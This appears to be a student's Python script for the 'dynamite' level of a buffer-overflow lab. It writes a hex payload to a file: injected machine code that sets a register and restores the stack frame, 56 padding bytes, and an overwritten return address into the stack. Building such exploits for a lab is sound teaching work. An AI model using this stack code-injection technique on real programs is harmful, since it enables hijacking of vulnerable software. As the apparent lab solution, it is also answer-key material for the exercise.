from struct import *

buf = ""

#exploit code
buf += "b8 06 de 2b 49 bd 40 34 68 55 68 2c 8e 04 08 c3 "
buf += ("31" + " ")*56
#55683378
buf += "7c 33 68 55"
f = open("exploit_dynamite.txt", "w") #sets up to write to file
f.write(buf) #writes to file

